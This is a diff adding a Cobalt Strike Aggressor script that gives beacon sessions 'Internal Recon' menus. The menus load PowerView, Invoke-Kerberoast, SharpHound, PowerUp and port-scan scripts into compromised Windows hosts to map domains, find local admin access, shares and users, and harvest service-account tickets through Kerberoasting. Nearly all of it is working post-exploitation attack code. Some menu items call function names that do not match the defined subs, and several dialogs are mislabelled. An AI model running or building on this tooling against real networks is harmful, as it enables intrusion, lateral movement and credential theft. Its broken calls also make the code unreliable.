@@ -1,0 +1,516 @@
+# Cobalt Strike Internal Recon Aggressor Script
+# TODO:
+#  Implement SMB Scanner module
+#  Implement Linux port scan module
+#  Implement linux responder module
+#  
+#  MITRE ID: T1171
+#  Add inveigh functionality
+#
+#  Add nmap functionality
+
+
+
+sub loadPSScripts {
+    $bid = $1;
+    $user1 = beacon_info($bid, "user");
+    $user2 = split(" ", $user1);	
+    $user = $user2[0];
+
+    $dialog = dialog("Load PowerShell Script", %(script => "Script..."), lambda({
+        if ("$3['script']" ismatch 'Script...') {
+            berror($bid, "\c4Please select a valid script.");
+            break;
+        }
+        else {
+            bpowershell_import($bid, $3['script']);
+        }
+    }));
+
+    dialog_description($dialog, "Loads a PowerShell script into memory.");
+    
+    drow_file($dialog, "script", "PowerShell Script:");
+    
+    dbutton_action($dialog, "Load");
+    dialog_show($dialog);
+}
+
+sub getNetDomain {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Get-NetDomain";
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub invokeKerberoast {
+    $bid = $1;
+
+    if (-exists script_resource("Invoke-Kerberoast.ps1")) {
+        bpowershell_import($bid, script_resource("Invoke-Kerberoast.ps1"));
+        $pscmd = "Invoke-Kerberoast";
+        bpowerpick($1, $pscmd);
+    }
+}
+
+sub bloodHound {
+    $bid = $1;
+
+    if (-exists script_resource("SharpHound.ps1")) {
+        bpowershell_import($bid, script_resource("SharpHound.ps1"));
+        $pscmd = "Invoke-BloodHound -CollectionMethod All -ZipFileName UpdateDocuments";
+        bpwd($bid);
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "SharpHound.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub invokePortscanFast {
+    $bid = $1;
+    $dialog = dialog("Port Scan (Fast)", %(hosts => "ip1,ip2,ip3", ports => "port1,port2,port3"), lambda({
+        if ("$3['hosts']" ismatch "ip1,ip2,ip3" || "$3['ports']" ismatch "port1,port2,port3") {
+            berror($bid, "\c4Please enter a comma-sperated list of IPs/hosts and ports.");
+            break;
+        }
+        else {
+            if (-exists script_resource("Invoke-Portscan.ps1")) {
+                bpwd($bid);
+                bpowershell_import($bid, script_resource("Invoke-Portscan.ps1"));
+                bpowerpick($bid, "Invoke-Portscan -Hosts '".$3['hosts']."' -Ports '".$3['ports']."' -T3");
+            }
+            else {
+                berror($bid, "Invoke-Portscan.ps1 must be in the same directory as this script.");
+            }
+        }
+    }));
+
+    dialog_description($dialog, "Performs a PowerShell-based portscan with an above-average speed.");
+    
+    drow_text($dialog, "hosts", "Hosts:");
+    drow_text($dialog, "ports", "Ports");
+    
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+}
+
+sub invokePortscanSlow {
+    $bid = $1;
+    $dialog = dialog("Port Scan (Slow)", %(hosts => "ip1,ip2,ip3", ports => "port1,port2,port3"), lambda({
+        if ("$3['hosts']" ismatch "ip1,ip2,ip3" || "$3['ports']" ismatch "port1,port2,port3") {
+            berror($bid, "\c4Please enter a comma-sperated list of IPs/hosts and ports.");
+            break;
+        }
+        else {
+            if (-exists script_resource("Invoke-Portscan.ps1")) {
+                bpwd($bid);
+                bpowershell_import($bid, script_resource("Invoke-Portscan.ps1"));
+                bpowerpick($bid, "Invoke-Portscan -Hosts '".$3['hosts']."' -Ports '".$3['ports']."' -T1");
+            }
+            else {
+                berror($bid, "Invoke-portscanner.ps1 must be in the same directory as this script.");
+            }
+        }
+    }));
+
+    dialog_description($dialog, "Performs a PowerShell-based portscan with a slow speed.");
+    
+    drow_text($dialog, "hosts", "Hosts:");
+    drow_text($dialog, "ports", "Ports");
+    
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+}
+
+sub invokeHostDiscoveryFast {
+    $bid = $1;
+    $dialog = dialog("Port Scan (Slow)", %(hosts => "ip1,ip2,ip3"), lambda({
+        if ("$3['hosts']" ismatch "ip1,ip2,ip3") {
+            berror($bid, "\c4Please enter a comma-sperated list of IPs/hosts.");
+            break;
+        }
+        else {
+            if (-exists script_resource("Invoke-Portscan.ps1")) {
+                bpwd($bid);
+                bpowershell_import($bid, script_resource("Invoke-Portscan.ps1"));
+                bpowerpick($bid, "Invoke-Portscan -Hosts '".$3['hosts']."' -PingOnly -T3");
+            }
+            else {
+                berror($bid, "Invoke-Portscan.ps1 must be in the same directory as this script.");
+            }
+        }
+    }));
+
+    dialog_description($dialog, "Performs a PowerShell-based portscan with a slow speed.");
+    
+    drow_text($dialog, "hosts", "Hosts:");
+    drow_text($dialog, "ports", "Ports");
+    
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+}
+
+sub invokeHostDiscoverySlow {
+    $bid = $1;
+    $dialog = dialog("Port Scan (Slow)", %(hosts => "ip1,ip2,ip3"), lambda({
+        if ("$3['hosts']" ismatch "ip1,ip2,ip3") {
+            berror($bid, "\c4Please enter a comma-sperated list of IPs/hosts.");
+            break;
+        }
+        else {
+            if (-exists script_resource("Invoke-Portscan.ps1")) {
+                bpwd($bid);
+                bpowershell_import($bid, script_resource("Invoke-Portscan.ps1"));
+                bpowerpick($bid, "Invoke-Portscan -Hosts '".$3['hosts']."' -PingOnly -T1");
+            }
+            else {
+                berror($bid, "Invoke-Portscan.ps1 must be in the same directory as this script.");
+            }
+        }
+    }));
+
+    dialog_description($dialog, "Performs a PowerShell-based portscan with a slow speed.");
+    
+    drow_text($dialog, "hosts", "Hosts:");
+    drow_text($dialog, "ports", "Ports");
+    
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+}
+
+sub getFileServer {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Get-NetFileServer";
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub findLocalAdminAccess {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Find-LocalAdminAccess";
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub getNetSubnet {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Get-NetSubnet";
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub getNetComputer {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Get-NetComputer";
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub getNetForest {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Get-NetForest";
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub getNetDomainControllers {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Get-NetDomainController";
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub invokeShareFinder {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Invoke-ShareFinder -ExcludePrint -ExcludeIPC -CheckShareAccess";
+        bpowerpick($1, $pscmd);
+    }
+    else {
+        berror($1, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub invokeUserHunter {
+    $bid = $1;
+
+    if (-exists script_resource("PowerView.ps1")) {
+        bpowershell_import($bid, script_resource("PowerView.ps1"));
+        $pscmd = "Invoke-UserHunter -CheckAccess";
+        bpowerpick($bid, $pscmd);
+    }
+    else {
+        berror($bid, "PowerView.ps1 must be in the same directory as this script.");
+    }
+}
+
+sub SPNScanner {
+    $bid = $1;
+    $dialog = dialog("SPN Scanner", %(spnstring => "SQL, FTP, *, etc."), lambda({
+        if ("$3['spnstring']" ismatch "SQL, FTP, *, etc.") {
+            berror($bid, "\c4Please enter a single SPN string to search for.");
+            break;
+        }
+        else {
+            if (-exists script_resource("SPNScanner.ps1")) {
+                bpowershell_import($bid, script_resource("SPNScanner.ps1"));
+                bpowerpick($bid, "Discover-SPNs '".$3['spnstring']."'");
+            }
+            else {
+                berror($bid, "SPNScanner.ps1 must be in the same directory as this script.");
+            }
+        }
+    }));
+
+    dialog_description($dialog, "Uses LDAP to identify hosts and service accounts within the network.");
+    
+    drow_text($dialog, "spnstring", "SPN String:");
+    
+    dbutton_action($dialog, "Search");
+    dialog_show($dialog);
+}
+
+# quickly run PowerUp (alias)
+alias powerup {
+    bpowershell_import($1, script_resource("PowerUp.ps1"));
+    bpowershell($1, "Invoke-AllChecks");
+}
+
+sub powerup {
+    bpowershell_import($1, script_resource("PowerUp.ps1"));
+    bpowershell($1, "Invoke-AllChecks");
+}
+
+sub userhunter {
+    bpowershell_import($1, script_resource("powerview.ps1"));
+    bpowershell($1, "Invoke-UserHunter");	
+}
+
+sub userhunter_stealth {
+    bpowershell_import($1, script_resource("powerview.ps1"));
+    bpowershell($1, "Invoke-UserHunter -Stealth");	
+}
+
+sub findlocaladmin {
+    bpowershell_import($1, script_resource("powerview.ps1"));
+    bpowershell($1, "Find-LocalAdminAccess");	
+}
+
+sub sharefinder {
+    bpowershell_import($1, script_resource("powerview.ps1"));
+    bpowershell($1, "Invoke-FileFinder -ShareList");	
+}
+
+
+menu "Internal Recon"{
+    menu "Windows"{
+        menu "&PowerView" {
+            item "&Load PowerShell Script"{
+                local('$bid');
+                foreach $bid ($1) {
+                    loadPSScripts($bid);
+                }
+            }
+            item "&Get-NetDomain" {
+                local('$bid');
+                foreach $bid ($1) {
+                    getNetDomain($bid);
+                }
+            }				
+            item "&Get-NetForest" {
+                local('$bid');
+                foreach $bid ($1) {
+                    getNetForest($bid);
+                }
+            }
+            item "&Get-NetDomainController" {
+                local('$bid');
+                foreach $bid ($1) {
+                    getNetDomainController($bid);
+                }
+            }		
+            item "&Get-NetComputer" {
+                local('$bid');
+                foreach $bid ($1) {
+                    getNetComputer($bid);
+                }
+            }		
+            item "&Get-NetFileServer" {
+                local('$bid');
+                foreach $bid ($1) {
+                    getNetFileServer($bid);
+                }
+            }
+            item "&Find-LocalAdminAccess" {
+                local('$bid');
+                foreach $bid ($1) {
+                    findLocalAdminAccess($bid);
+                }
+            }
+            item "&Invoke-ShareFinder" {
+                local('$bid');
+                foreach $bid ($1) {
+                    invokeShareFinder($bid);
+                }
+            }				
+            item "&Invoke-UserHunter" {
+                local('$bid');
+                foreach $bid ($1) {
+                    invokeUserHunter($bid);
+                }
+            }			
+            item "&Get-NetSubnet" {
+                local('$bid');
+                foreach $bid ($1) {
+                    getNetSubnet($bid);
+                }
+            }
+            item "&Invoke-Kerberoast" {
+                local('$bid');
+                foreach $bid ($1) {
+                    invokeKerberoast($bid);
+                }
+            }			
+        }
+        item "&SPN Scanner" {
+            local('$bid');
+            foreach $bid ($1) {
+                SPNScanner($bid);
+            }
+        }
+        item "&Port Scan (Fast)" {
+            local('$bid');
+            foreach $bid ($1) {
+                invokePortscanFast($bid);
+            }
+        }
+        item "&Port Scan (Slow)" {
+            local('$bid');
+            foreach $bid ($1) {
+                invokePortscanSlow($bid);
+            }
+        }
+        item "&Host Discovery (Fast)" {
+            local('$bid');
+            foreach $bid ($1) {
+                invokeHostDiscoveryFast($bid);
+            }
+        }
+        item "&Host Discovery (Slow)" {
+            local('$bid');
+            foreach $bid ($1) {
+                invokeHostDiscoverySlow($bid);
+            }
+        }
+        item "&BloodHound" {
+            local('$bid');
+            foreach $bid ($1) {
+                bloodHound($bid);
+            }
+        }
+
+        item "PowerUp" {
+            if (-exists script_resource("PowerUp.ps1")) {
+                local('$bid');
+                foreach $bid ($1) {
+                    powerup($bid);
+                }
+            }
+            else {
+                berror($1, "PowerUp.ps1 does not exist :(");
+            }
+        }
+
+        item "UserHunter" {
+            if (-exists script_resource("powerview.ps1")) {		
+                local('$bid');
+                foreach $bid ($1) {
+                    userhunter($bid);
+                }
+            }
+            else {
+                berror($1, "powerview.ps1 does not exist :(");
+            }
+        }
+
+        item "UserHunter (Stealth)" {
+            if (-exists script_resource("powerview.ps1")) {		
+                local('$bid');
+                foreach $bid ($1) {
+                    userhunter_stealth($bid);
+                }
+            }
+            else {
+                berror($1, "powerview.ps1 does not exist :(");
+            }
+        }
+
+        item "Find-LocalAdminAccess" {
+            if (-exists script_resource("powerview.ps1")) {		
+                local('$bid');
+                foreach $bid ($1) {
+                    findlocaladmin($bid);
+                }
+            }
+            else {
+                berror($1, "powerview.ps1 does not exist :(");
+            }
+        }
+        
+        item "Sharefinder" {
+            if (-exists script_resource("powerview.ps1")) {		
+                local('$bid');
+                foreach $bid ($1) {
+                    sharefinder($bid);
+                }
+            }
+            else {
+                berror($1, "powerview.ps1 does not exist :(");
+            }
+        }
+    }
+}
